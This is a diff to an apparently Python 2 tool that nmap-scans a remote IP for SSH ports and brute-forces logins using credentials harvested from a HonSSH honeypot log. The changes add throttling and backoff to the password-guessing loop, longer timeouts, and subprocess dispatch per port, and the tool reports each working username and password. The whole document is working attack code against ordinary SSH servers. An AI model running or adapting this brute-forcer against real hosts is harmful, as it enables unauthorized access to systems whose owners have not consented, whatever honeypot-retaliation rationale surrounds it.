@@ -11,7 +11,7 @@ from twisted.internet.protocol import ReconnectingClientFactory, ProcessProtocol
 from paramiko import SSHClient, Transport
 from paramiko.client import AutoAddPolicy
 from paramiko.ssh_exception import AuthenticationException
-from sys import stdout, argv
+from sys import stdout, stderr, argv
 from os import environ
 from os.path import dirname
 from copy import copy
@@ -43,38 +43,55 @@ def msg(color, identifier, message):
 
 class SshTarget(object):
     def __init__(self):
+        import logging
+        logging.basicConfig(stream=stderr, level=logging.CRITICAL)
+
         self.client = SSHClient()
         self.client.set_missing_host_key_policy(AutoAddPolicy)
 
     def fire(self, remote_tuple, user_pass_list):
         valid_logins = []
-        for usern, passw in user_pass_list:
-            try:
-                self.client.connect(str(remote_tuple[0]),
-                    look_for_keys=False,
-                    allow_agent=False,
-                    gss_deleg_creds=False,
-                    gss_trust_dns=False,
-                    auth_timeout=5.0,
-                    banner_timeout=3.0,
-                    timeout=3.0,
-                    port=int(remote_tuple[1]),
-                    username=usern,
-                    password=passw
-                )
-            except AuthenticationException:
-                pass
-            except Exception as ex:
-                msg(LRED, '[SSH][BRUTE-FORCE]',
-                    '%s:%s - %s' %
-                    (remote_tuple[0], remote_tuple[1], str(ex))
-                )
-            else:
-                msg(LGREEN, '[SSH][BRUTE-FORCE]',
-                    'LOGIN SUCCEEDED for <%s:%s> with user/pass %s/%s' %
-                    (remote_tuple[0], remote_tuple[1], usern, passw)
-                )
-                valid_logins.append((usern, passw))
+        sleep_time = 0.5
+        sleep_fac = 0.01
+
+        while len(user_pass_list) > 0:
+            failed = False
+            for usern, passw in user_pass_list:
+                try:
+                    time.sleep(sleep_time)
+                    sleep_time += sleep_time * sleep_fac
+                    self.client.connect(str(remote_tuple[0]),
+                        look_for_keys=False,
+                        allow_agent=False,
+                        gss_deleg_creds=False,
+                        gss_trust_dns=False,
+                        auth_timeout=10.0,
+                        banner_timeout=10.0,
+                        timeout=10.0,
+                        port=int(remote_tuple[1]),
+                        username=usern,
+                        password=passw
+                    )
+                    self.client.close()
+                except AuthenticationException:
+                    user_pass_list.remove((usern,passw))
+                    break
+                except Exception as ex:
+                    stderr.write('USER %s/%s - %s\n' %
+                        (usern, passw, str(ex))
+                    )
+                    failed = True
+                    break
+                else:
+                    user_pass_list.remove((usern,passw))
+                    valid_logins.append((usern, passw))
+                    sleep_time /= 2
+                    break
+
+            if failed is True:
+                sleep_time *= 2
+                stderr.write('INCREASED sleep time to %s\n' %
+                    (sleep_time))
         return valid_logins
 
     @staticmethod
@@ -85,18 +102,49 @@ class SshTarget(object):
                 for line in slog.readlines():
                     result.append(re.search(r'^(.*?) - (.*?) - ', line).groups())
         except Exception as ex:
-            msg(RED, '[HONSSH][SPOOF-LOG]', 'Error: %s' % (str(ex)))
+            stderr.write('Error: %s\n' % (str(ex)))
         return result
 
     @staticmethod
-    def sshBruteForce(remote_ip, possible_ssh_ports):
+    def sshBruteForce(remote_ip, possible_ssh_port):
         ssh = SshTarget()
-        result = {}
         user_pass_list = SshTarget.parseHonsshSpoofLog()
-        for possible_ssh_port in possible_ssh_ports:
-            result[str(possible_ssh_port)] = \
-                ssh.fire((remote_ip, possible_ssh_port), user_pass_list)
-        return result
+        result = ssh.fire((remote_ip, possible_ssh_port), user_pass_list)
+        print json.dumps(result, indent=4, sort_keys=True)
+
+class SshReceiver(ProcessProtocol):
+    json_output = ''
+
+    def __init__(self, parent, deferred, (remote_tuple)):
+        self.parent = parent
+        self.deferred = deferred
+        self.remote_tuple = remote_tuple
+
+    def done(self, reason):
+        msg(LGREEN, '[PROTOCOL][SSH]', 'BruteForce <%s:%s> finished. Result: <%s>' %
+            (self.remote_tuple[0], self.remote_tuple[1], reason))
+
+    def childDataReceived(self, childFD, data):
+        if childFD == 1:
+            self.json_output += data
+        elif childFD == 2:
+            if data[-1:] == '\n':
+                data = data[:-1]
+            msg(RED, '[PROTOCOL][SSH]', 'BruteForce <%s:%s> error: <%s>' %
+                (self.remote_tuple[0], self.remote_tuple[1], data))
+
+    def errReceived(self, data):
+        msg(LRED, '[PROTOCOL][SSH]', 'Error received (%d bytes): <%s>' % (len(data), str(data)))
+
+    def processEnded(self, reason):
+        if reason.value.exitCode == 0:
+            self.done('Ssh succeeded')
+            self.deferred.callback(
+                (self.parent, self.remote_tuple, self.json_output)
+            )
+        else:
+            self.done(reason)
+            raise Exception('SshReceiver: ssh exited abnormally')
 
 class NmapTarget(object):
     nm = nmap.PortScanner()
@@ -170,10 +218,26 @@ class JsonReceiver(LineReceiver):
         return True if self.remote_ip not in self.targets else False
 
     def startSshBruteForce(self, possible_ssh_ports):
-        msg(LBLUE, '[PROTOCOL][DISPATCH]', 'Initiating SSH brute force for <%s>..' %
-            (self.remote_ip)
-        )
-        return SshTarget.sshBruteForce(self.remote_ip, possible_ssh_ports)
+        def errorCallback(err):
+            msg(RED, '[ERROR]', str(err))
+        def sshSucceeded((_self, remote_tuple, json_output)):
+            json_list = json.loads(json_output)
+            for usern, passw in json_list:
+                msg(LGREEN, '[PROTOCOL][SSH]',
+                    'BruteForce succeeded for <%s:%s> with <%s/%s>' %
+                    (remote_tuple[0], remote_tuple[1], usern, passw))
+
+        for possible_ssh_port in possible_ssh_ports:
+            msg(LBLUE, '[PROTOCOL][DISPATCH]',
+                'Initiating SSH brute force for <%s:%s>..' %
+                (self.remote_ip, possible_ssh_port))
+            d = defer.Deferred()
+            d.addCallbacks(sshSucceeded, errorCallback)
+            reactor.spawnProcess(
+                SshReceiver(self, d, (self.remote_ip, possible_ssh_port)),
+                argv[0], [argv[0], "ssh", self.remote_ip+':'+possible_ssh_port],
+                environ, usePTY=False, childFDs={1:'r',2:'r'}
+            )
 
     def getPossibleSshServices(self):
         if self.remote_ip not in self.targets:
@@ -210,27 +274,13 @@ class JsonReceiver(LineReceiver):
                 (len(ssh_services), str(ssh_services))
             )
             if len(ssh_services) == 0:
-                raise Exception('No open SSH services for <%s> found.' % (remote_ip))
-            return (_self, ssh_services)
-        def sshBruteForce((_self, port_list)):
-            return (_self, _self.startSshBruteForce(port_list))
-        def sshSucceeded((_self, upp)):
-            for port, user_pw_list in upp.iteritems():
-                if len(user_pw_list) > 0:
-                    msg(LGREEN, '[PROTOCOL][DISPATCH]',
-                        'SSH for <%s:%s> succeeded with %d valid Logins ..' %
-                        (_self.remote_ip, str(port), len(user_pw_list))
-                    )
-                else:
-                    msg(LRED, '[PROTOCOL][DISPATCH]', 'No valid SSH Logins for <%s:%s>.' %
-                        (_self.remote_ip, str(port))
-                    )
+                msg(LRED, '[PROTOCOL][NMAP]', 'No open SSH services for <%s> found.' % (remote_ip))
+            else:
+                _self.startSshBruteForce(ssh_services)
 
         s = copy(self)
         s.deferred = defer.Deferred()
         s.deferred.addCallbacks(nmapSucceeded, errorCallback)
-        s.deferred.addCallback(sshBruteForce)
-        s.deferred.addCallbacks(sshSucceeded, errorCallback)
         s.startNmap(s.remote_ip)
 
     def dispatch(self, proto_json):
@@ -283,9 +333,13 @@ if __name__ == '__main__':
             exit(0)
         # SSH BruteForce target
         elif argv[1] == 'ssh':
-            ip = argv[2].split(':')[0]
-            port = argv[2].split(':')[1]
-            print SshTarget.sshBruteForce(ip, [port])
+            host_port = argv[2].split(':')
+            if len(host_port) == 2:
+                ip, port = host_port
+            else:
+                ip = argv[2]
+                port = '22'
+            SshTarget.sshBruteForce(ip, port)
             exit(0)
 
     if len(argv) == 0:
